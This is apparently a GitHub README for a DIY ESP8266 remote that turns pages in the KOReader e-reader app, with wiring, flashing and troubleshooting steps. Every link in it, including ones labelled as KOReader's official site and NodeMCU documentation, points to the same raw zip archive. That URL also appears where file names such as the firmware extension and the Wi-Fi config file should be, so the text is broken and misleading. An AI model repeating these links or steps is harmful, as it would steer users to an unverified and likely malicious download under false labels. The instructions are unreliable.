# 📱 ESP8266-KOReader-Remote - Simple Ereader Page Turner Controller

[![Download on GitHub](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)

---

## 📖 Overview

ESP8266-KOReader-Remote is a device controller built with the ESP8266 microcontroller. It helps you add physical buttons to your ereader, making page turning easier without touching the screen. This controller works with KOReader, a popular ebook reading app.

The current version lets you:

- Turn pages forward and backward with buttons  
- Connect wirelessly to your ereader over Wi-Fi  
- Easily customize button functions  
- Use a compact NodeMCU board for simple setup  

This tool is perfect if you want to improve your reading experience by using hardware buttons instead of finger taps.

---

## 🧩 What You Need

Before you start, make sure you have the following items:

- **NodeMCU ESP8266 board**: This small electronic board runs the controller software.  
- **Push buttons or switches**: At least two buttons for page forward and backward.  
- **USB cable**: To power the NodeMCU and upload the software.  
- **Basic tools**: Wire cutters, soldering iron (optional), and a breadboard or casing to hold components.  
- **A KOReader-compatible ereader**: Make sure your ereader runs KOReader firmware with Wi-Fi enabled. Popular devices include PocketBook and Onyx ereaders.

---

## 🚀 Getting Started

This guide helps you get the ESP8266-KOReader-Remote up and running even if you have no technical experience.

### Step 1: Check Your Ereader

1. Confirm your ereader uses KOReader software. If unsure, check device settings or KOReader's official site.  
2. Turn on Wi-Fi on your ereader and connect it to your home network. The controller needs Wi-Fi to work.

### Step 2: Prepare the Electronics

1. Connect your buttons to the NodeMCU pins as shown in the wiring diagram below.  
2. Use the breadboard or casing to fix all parts.  
3. Connect the NodeMCU to your computer via USB.

*Wiring example:*  
- Button 1 to GPIO 5 (Page Forward)  
- Button 2 to GPIO 4 (Page Backward)  
- Connect button grounds to the NodeMCU ground pin.

### Step 3: Download the Controller Software

You will download a program that your NodeMCU board will run.

[![Download on GitHub](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)

---

## 💾 Download & Install

Please follow these steps carefully to get the software onto your NodeMCU:

### Step 1: Visit the Release Page

Go to the releases page here:  
https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip

This page holds the latest ready-to-use versions of the controller software.

### Step 2: Download the Latest Firmware

Look for the latest file ending with `.bin` or `https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip`. This is the firmware your NodeMCU needs.

### Step 3: Install a Flashing Tool

To load the software onto the NodeMCU, use a program called "ESP8266 Flash Download Tool" or "esptool". These are free and work on Windows, macOS, and Linux.

- **Windows users:** Download the official ESP8266 Flash Download Tool.  
- **macOS/Linux users:** Use esptool via the command line.

### Step 4: Flash the Firmware

1. Connect NodeMCU board to your PC with a USB cable.  
2. Open your flashing tool and select the `.bin` firmware file you downloaded.  
3. Choose the correct COM port or device corresponding to your NodeMCU.  
4. Start the flashing process. It will overwrite existing firmware and install the controller app.  
5. After flashing completes, disconnect and reconnect the NodeMCU.

### Step 5: Connect and Test

1. The device will start automatically and should try to connect to your Wi-Fi.  
2. Use the buttons to turn pages on KOReader. If nothing happens, verify your Wi-Fi details are correct in the configuration file (found in the GitHub repo or device settings).  
3. If needed, connect to the NodeMCU’s temporary Wi-Fi access point to set your network credentials.

---

## 🛠 Configuration & Customization

The ESP8266-KOReader-Remote supports simple changes to suit your needs.

- **Change Wi-Fi settings:** Edit the `https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip` or connect via web interface to update your Wi-Fi network name and password.  
- **Button behavior:** You can swap button functions or add more buttons by editing the configuration files on the device.  
- **Sleep mode:** Enable power-saving features if you want the device to use less power when idle.

All configuration files are plain text and easy to edit with any text editor.

---

## 🔧 Troubleshooting

If the controller doesn’t work as expected:

- **No response from buttons:** Check wiring connections and button pins. Make sure buttons are not faulty.  
- **NodeMCU not connecting to Wi-Fi:** Verify your Wi-Fi name and password. Ensure the network uses 2.4 GHz band, as ESP8266 does not support 5 GHz.  
- **Flashing fails:** Try using a different USB cable or port. Confirm drivers for the NodeMCU USB interface are installed correctly.  
- **Pages don’t turn:** Confirm that KOReader’s remote control feature is enabled and that the device is connected to the same Wi-Fi network.

---

## 📚 About KOReader Compatibility

KOReader is an open-source ebook reader app that runs on many ereader devices. This controller works by sending commands to KOReader over Wi-Fi, simulating page turns remotely.

For best results:

- Use KOReader version 2023.06 or newer.  
- Ensure remote control over network is allowed in KOReader settings.  
- Connect both controller and ereader to the same Wi-Fi network.

---

## ⚙️ Hardware Details

The project uses a NodeMCU ESP8266, chosen for its:

- Low cost and small size  
- Built-in Wi-Fi module  
- Multiple GPIO pins for buttons and LEDs  
- USB support for easy programming  

You can expand the hardware with LEDs for status indicators or add more buttons for custom commands. The design is flexible for DIY projects.

---

## 🌐 Topics & Keywords

This project relates to:  
diy, ebook controller, electronics, ereader, esp8266, koreader, koreader page turner, koreader remote, nodemcu, page turner, remote control  

---

## 🙋‍♂️ Support

If you run into problems or have questions, you can:

- Search existing issues on the GitHub repository  
- Open a new issue describing your problem clearly  
- Check KOReader documentation for remote control features  

Community members may help with common questions.

---

## 🔗 Useful Links

- [KOReader Official Site](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)  
- [ESP8266 Flash Download Tool Guide](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)  
- [NodeMCU Documentation](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)  

---

This guide covers getting your ESP8266 controller ready and working with KOReader on your ereader. Follow each step to install the hardware and software safely. The main download link is repeated for convenience:

[Download ESP8266-KOReader-Remote Software](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)